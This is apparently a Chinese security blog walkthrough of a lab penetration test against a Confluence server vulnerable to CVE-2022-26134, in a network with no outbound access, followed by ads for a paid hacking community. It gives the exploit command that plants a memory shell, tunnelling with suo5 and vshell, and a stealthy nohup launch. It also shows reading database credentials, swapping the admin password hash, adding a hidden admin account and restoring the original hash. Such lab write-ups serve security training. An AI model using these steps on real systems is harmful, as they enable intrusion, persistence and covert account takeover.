---
title: 不出网环境下的渗透测试
url: https://mp.weixin.qq.com/s/3r2abliHAvSM7sboD_8rQw
source: Doonsec's feed
date: 2026-07-17
fetch_date: 2026-07-18T04:41:08.480092
---

# 不出网环境下的渗透测试

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboTuybvqQDSILHswbM8I59vIISc7piaEjBhduUMCanRp7WbRjMmBhFhoNUu9ljaLW0iaqewedajjuon0PkmMia51yfEqZkcWzwYub4/0?wx_fmt=jpeg)

# 不出网环境下的渗透测试

kele
kele

陌笙不太懂安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

免责声明

```
由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号陌笙不太懂安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```

```
作者:kele原文链接:https://xz.aliyun.com/news/17321
```

## 提要

本次模拟不出网环境下的渗透测试，靶机搭建了有CVE-2022-26134漏洞的confluence服务

confluence服务位于端口8090

用到的工具有vshell，suo5，哥斯拉，proxifier，navicat

靶机ip：10.10.10.135

攻击机：10.10.10.1

## 正式操作

##

首先我们上传带有CVE-2022-26134的内存马

```
E:\web\tools\ONE-FOX集成工具箱_V8.2公开版_by狐狸\Java_path\Java_8_win\bin\java.exe -jar CVE-2022-26134.jar http://10.10.10.135:8090/ pass key
```

哥斯拉连接成功后，利用suo5插件注入Suo5Filter马

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTSccpicTjA7EbRC4oKQwmJlfssXCUmBoNCI5QfZePrcqj0lePVG4TVhgySTk3ovjBmVPwmbT6f0mjwMibrQibuFnR3m8H2c8xAU4/640?wx_fmt=png&from=appmsg)

注入成功后，我们就用suo5客户端连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSPviaSubY6WFsmviadEGF48nBrSNYOWnud9MfWN2SzA5BtIOkCa1ibCLdlv5icic6PfCxyt5SH34gJWkIwHNCnalPoQictbgMiczggmw/640?wx_fmt=png&from=appmsg)

至此，我们的一层代理就搭好了

现在我们使用vshell生成正向监听器

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSicPb245g77bGZGicdD1a3fPNs45b8gQ1OIbD68T3IAerX2QESI5k611hAia73lVzdmavHibolO2icKia38QhicV0Uxrzrn047DJeLpY/640?wx_fmt=png&from=appmsg)

下载成功后，我们利用哥斯拉上传文件到`/var/tmp`里

然后在哥斯拉里的虚拟终端上赋权+nohup运行（nohup执行不留痕迹）

```
cd /var/tmpchmod +x tcp_linux_amd64nohup ./tcp_linux_amd64 > /dev/null 2>&1 &
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTEXib0ibBiachJSBTJksgk9CFrUXol2vgR90WyicVD6fa5Bx42grp580UPQkdWo3cIW366ZfOibqFYerRMuzibrpHFTBMv1dfXMccRI/640?wx_fmt=png&from=appmsg)

然后查看内网ip

```
cat /etc/hosts#172.18.0.3
```

然后我们就可以在vshell上建立正向连接了

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRG6ZthvJ2VhLvibLRSMbpFdew4J7r9ibJuQArQsp2PUW6VzvvjC4hpYqnFs9hJP5UN8nxC9IWmN1iaDhWwHj9CbxMnzzskIciaNzM/640?wx_fmt=png&from=appmsg)

成功连接

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSZYLHHzT0O1wPovhdMFCGKHYOH82ictEoTFl25Yiaj9UKeRTGs8eRdqBorcqfmEmdLmGVnR0xCR0wa6bS7c7Pqt73sCFumGhVB4/640?wx_fmt=png&from=appmsg)

我们拥有了正向shell之后，我们可以在`/var/atlassian/application-data/confluence/confluence.cfg.xml`里看到数据库ip、账号、密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRz6Dcoumj2TK0ntyCyX1NB19CgSaZkpYS7Mp6LEaOoYwpR4BVSicbe6nticpK02yoCj0HGzhhDG6g8QPsKZqfjfnctexYlAEGGE/640?wx_fmt=png&from=appmsg)

账号密码`postgres:postgres`，但是数据库的ip被db顶替了，端口为5432，我们用curl查看

```
curl db -vv
```

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR9DvfIUySH2VyiagJxONeZiagpfE5DRb8C04DPwV50pdDhhb57cv4vfAMhF0wXFq8lRiaX9nsIvVlfkTH8ib5nUsnRlgPUn4icBf6Q/640?wx_fmt=png&from=appmsg)

可以看到数据库IP为`172.18.0.2`

然后我们现在可以搭建第二个代理来把数据库引出来

首先在vshell里创建隧道

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSGicHNYEPaiaVf2iagFQVJ1kkD3iaHdxQMibovl5h3M5haPNjsibyjl9h9bMFRt04JHp780O5HNGdrZ1uiaMQBFLtUnCf4xVRLYicknqI/640?wx_fmt=png&from=appmsg)

然后我们启动proxifier设置一下

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQqVukLOacpPzcFTgozVe9CibNQrFJ9Loiblsd0vjdRpiaCibAUUNT4Ye58lxFFOzXWbeKdDSMhAm4ChRsepibD7TXnnVLfxkXHI5JU/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ4UIrWcNn2lY0LwBFx40aK1plZeJ3aF47Jya7b2icSmjsVoWnlRMV0xxur4UwRKYoTNsK5uib6SSDHsNpYcGHNtJ5AHrhsmqhh4/640?wx_fmt=png&from=appmsg)

然后使用navicat连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSLO6hBcgrgvAR6HPSxZBbOSWgJevMoMKnCQIib1bER1QItveVoMeJic8Nicu5Hqxz70ia13pnCV9vPicjnqgxemQ7vYWLUclicGCOV8/640?wx_fmt=png&from=appmsg)

我们可以在`confluence`库里的`cwd_user`表里查看到管理员账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRQw4W9432vGOVBdQpKNpWodvX8yPHlX3JxAcialuv7GJpC60QkpHzRuDtLK7zKMk1W39x24cBL4cdTlLClDO1c3OgJ9P2nDB8Q/640?wx_fmt=png&from=appmsg)

由于confluence数据库密码使用的是 PBKDF2加密，我们先将此密码备份下来

```
{PKCS5S2}X1AmkpM26Jj50k/2GNBEHB2DfbvKTmoevf90yaWYgALYVarRZK1Bmv2XcdxjDvPR
```

然后我们将其替换成密码123456

```
{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm
```

然后快速登录confluence

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSLqX13kwE6aA4xS8YaE2xXsjAReU7bpKUY0rKLX6P2EjSbad2M4P4ia1u8sxJeKnicyNF9rIibpSscVpxjSuwibyhqnYesXWE2RM0/640?wx_fmt=png&from=appmsg)

成功登陆后，我们快速创建新的管理员账号

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTM5NdWH9DwDPsEX14ov6OWE6tkvO67gdERH0DtlI3OF4iaIZlXYLuNTUJCsUaict0g0HZLmFphS2VjqRBf1vDH5VCiafG8olWdCo/640?wx_fmt=png&from=appmsg)

然后退出admin账号，并将其密码修改成原来的密码

至此，渗透后利用就可以由此展开了。。。

## 总结

模拟靶机不出网的情况下，首先我们使用suo5代理出shell到vshell，然后再利用proxifier代理出数据库到本地navicat，再在此基础上进行操作。

**后台回复加群加入交流群**

**广告：****cisp pte/pts &nisp1级2级低价报考**

**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库****简单介绍****（****加入纷传圈子****送****知识库+漏洞库+面试题库****）**

如果觉得合适可以加入,圈子目前价格39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。

**圈子福利**

**edu漏洞挖掘1v1指导出洞**

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg)

**陌笙src挖掘知识库介绍（内容持续更新中!!!)**

```
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)弱口令漏洞&未授权访问漏洞挖掘任意文件读取&删除&下载&上传漏洞sql注入漏洞url重定向漏洞csrf&ssrf漏洞挖掘XSS&XXE漏洞挖掘等等常见漏洞cors&目录遍历&越权漏洞挖掘EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)CNVD挖掘技巧分享&实战案例报告编写公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)经典常见Nday漏洞(常见中间件&以及各种常见框架)复现云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）APP&小程序漏洞挖掘等各模块不在一一介绍
```

信息收集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTu9DGyTubluhYicFynwVBKa4V06sDfEVKOyk5Q4ghZzLMDAuLb1M1oR4RJumGWrADPapFjTrOjpksKQ8q0YYCnl3ZWLof8Knzg/640?wx_fmt=png&from=appmsg)

src挖掘基础

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR45bibbJEb28a1gS5yth3r5HyOsgPiaOUHHYriahZyIyrk0LMOsHW4VoDibyBRibTNzptGiaLWX62UwykicwvbxCJPopvklqiaxML8lS8/640?wx_fmt=png&from=appmsg)

src挖掘实战

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTKWnTsN6CXf3djhXIlMKNRjVmJn3g5b23ur9E6Cx3O68f0hXVjCiaj8J4RYeTGBecqf1k99phG0ice2wtd5lKgR46OeqeLQfMpk/640?wx_fmt=png&from=appmsg)

edusrc

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQVVlTXhibjR8UiakZBQicXRZrQ7hdoOz5G8MQrcuDBGbqJdO0kIz6R9IU4ObAeOiabT8pr6lc7jibdIkKoTjiaXNHPLAwAB3BV2UvLM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSCrvarBbzP4L9kS6P0LVH9JMdmcbFDKiaicHqMFgTxq3x4iatjDJQicmc7NPC14C9Fk3icFjrouSgNVaN8Byuf0C0Iq9O6D1XPvFvY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRALwXmgZ4mh2LW0RdicrKjBCP7P1iaF14G0Eq2v3KRnTJORpwXZlF58WEz6QicxLJpyJaA5iah5CF2rHjBz4JzOELFRaZTAKOQ2tQ/640?wx_fmt=png&from=appmsg)

经典nday复现

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRu8Gf849iaCkSBxLL8IlzJTRs185QicEe9l5UGI1dEVKISt2IGGveZynXBW9tIUsxNsz4adSTib7rib50uSJdjNfTvVRFrbPJhzL4/640?wx_fmt=png&from=appmsg)

云安全&AI安全

![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ9qiavETNjaaX162czpNCqpw3uJqVpicbI15AXzhf5x8icmHxBdTGOgRgzNPGF3Aw2gglT4Fx09JGXYibQC6U7CQKVmoH08l3meia4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQgcsjiaZ4S26TWowHfpBkhSeHf2pjrcDyicJuia3uqvRBauLEOicibibEMqibnBMtjopFL8No7UXNibbURvzeJ3dQHTibvGxRQGnorb4co/640?wx_fmt=png&from=appmsg)

**陌笙安全漏洞库介绍**

```
最新漏洞查看1day&0day分享EDU学校相关漏洞Web应用漏洞CMS漏洞OA产品漏洞中间件漏洞云安全漏洞人工智能漏洞其他漏洞
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTFBRMa8XwYxfcZMyXicx94xSKxawPcqFia2rJKOL7fSLYXiccwHc868XxNGIQ5z7ibiaI1MNAGRrK7U6wXJTsZOCAu2I5XV1boTAL4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSBzdakI9XI33ReAm2dxO8vgzw3JicQmUuWCb5ayBlKR1PoQHEHFETteBnicyupwU0mXvXibfrDoyg8nSWBGoK1p2YXY3ElhcvOQ0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSajCclDhuRpaLic9Ld915CHU7RqSC1LCrPGfNZiavdPEVeDedDWOPBhtMLCicTp3RNd1lT0Pmfo3mx5B0hUxbQg3ic6Via90NMtZVk/640?wx_fmt=png&from=appmsg)

**陌笙安全面试库**

```
渗透测试基本问题一汇总渗透测试基本问题二汇总渗透测试基本问...